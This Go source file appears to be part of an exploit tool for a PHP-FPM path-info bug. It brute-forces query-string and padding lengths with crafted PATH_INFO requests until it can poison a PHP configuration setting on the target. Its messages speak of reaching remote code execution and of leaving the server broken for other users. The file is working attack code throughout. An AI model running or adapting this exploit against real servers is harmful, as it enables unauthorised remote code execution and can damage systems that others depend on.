package main

import (
	"errors"
	"fmt"
	"log"
	"net/http"
	"os"
	"strings"
)

type AttackParams struct {
	QueryStringLength int
	PisosLength       int
}

func (ap *AttackParams) Complete() bool {
	return ap.QueryStringLength != 0 && ap.PisosLength != 0
}

func (ap *AttackParams) String() string {
	s := fmt.Sprintf("--qsl %v --pisos %v", ap.QueryStringLength, ap.PisosLength)
	if ap.Complete() {
		s += " --skip-detect"
	}
	return s
}

func Detect(requester *Requester, method *DetectMethod, hints *AttackParams) (*AttackParams, error) {
	for try := 0; try < 10; try++ {
		if err := SanityCheck(requester, method); err != nil {
			return nil, fmt.Errorf("sanity check failed: %v", err)
		}
	}

	var qslCandidates []int

	if hints.QueryStringLength != 0 {
		log.Printf("Skipping qsl detection, using hint (qsl=%v)", hints.QueryStringLength)
		qslCandidates = append(qslCandidates, hints.QueryStringLength)
	} else {
		breakingPayload := "/PHP\n" + strings.Repeat("SOSAT", 10)[:PosOffset-9]
		for qsl := MinQSL; qsl <= MaxQSL; qsl += QSLDetectStep {
			ap := &AttackParams{qsl, 1}
			resp, _, err := requester.Request(breakingPayload, ap)
			if err != nil {
				return nil, fmt.Errorf("error for %#v: %v", ap, err)
			}
			if resp.StatusCode != http.StatusOK {
				log.Printf("Status code %v for qsl=%v, adding as a candidate", resp.StatusCode, qsl)
				qslCandidates = append(qslCandidates, qsl)
			}
		}
	}

	if len(qslCandidates) == 0 {
		return nil, errors.New("no qsl candidates found, invulnerable or something wrong")
	}

	if len(qslCandidates) > MaxQSLCandidates {
		return nil, errors.New("too many qsl candidates found, looks like I got banned")
	}

	var plCandidates []int
	if hints.PisosLength != 0 {
		plCandidates = append(plCandidates, hints.PisosLength)
		log.Printf("Skipping pisos length brute, using hint (pl=%v)", hints.PisosLength)
	} else {
		for i := 1; i <= MaxPisosLength; i++ {
			plCandidates = append(plCandidates, i)
		}
	}

	for try := 0; try < SettingEnableRetries; try += 1 {
		for _, qsl := range qslCandidates {
			for delta := 0; delta <= MaxQSLDetectDelta; delta += QSLDetectStep {
				for _, pl := range plCandidates {
					params := &AttackParams{qsl - delta, pl}
					resp, data, err := requester.Request(MakePathInfo(method.PHPOptionEnable), params)
					if err != nil {
						return nil, fmt.Errorf("error for %#v: %v", params, err)
					}
					if resp.StatusCode != http.StatusOK {
						log.Printf("Status code %v for %#v", resp.StatusCode, params)
					}

					if method.Check(resp, data) {
						log.Printf("Attack params found: %v", params)
						return params, SetSetting(requester, params, method.PHPOptionDisable)
					}
				}
			}
		}
	}

	return nil, fmt.Errorf("not vulnerable or other failure, IDK")
}

func SanityCheck(requester *Requester, method *DetectMethod) error {
	resp, data, err := requester.Request("/PHP\nSOSAT", &AttackParams{
		QueryStringLength: MaxQSL,
		PisosLength:       MaxPisosLength,
	})
	if err != nil {
		return err
	}

	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("invalid status code when checking path_info: %v (must be 200), maybe PATH_INFO not allowed", resp.StatusCode)
	}

	if method.Check(resp, data) {
		_, _ = fmt.Fprintf(os.Stderr, `
OK, here's what happened:

I was trying to set %#v setting using the vulnerability. 
If it had been set I would have been able to detect it so I would have known
the attack params. However, my %#v detector says it's
already set before I took any actions.

This can happen for one of two reasons:

1. The server has %#v already enabled in the config (or the script behaves like it).
2. You launched the attack previously and resetting back to %#v failed.

If it's 1, everything is simple: try another detection method.

If it's 2, there might be some problems. The server now runs with the poisoned
config and may seem broken for other users if the detection method is intrusive 
(like "output_handler=md5"). I don't know how to fix it.

If you have previously retrieved attack params (QSL and Pisos) try to use them
with --skip-detection. If you manage to get RCE you can fix the server. Another 
option is to try --reset-setting flag, but I'm not sure it will help.

If you don't have attack params, used intrusive detection method and don't own the
server, you are fucked.

`, method.PHPOptionEnable, method.PHPOptionEnable, method.PHPOptionEnable, method.PHPOptionDisable)

		return fmt.Errorf("already attacked? Setting %v seems to be set", method.PHPOptionEnable)
	}

	return nil
}
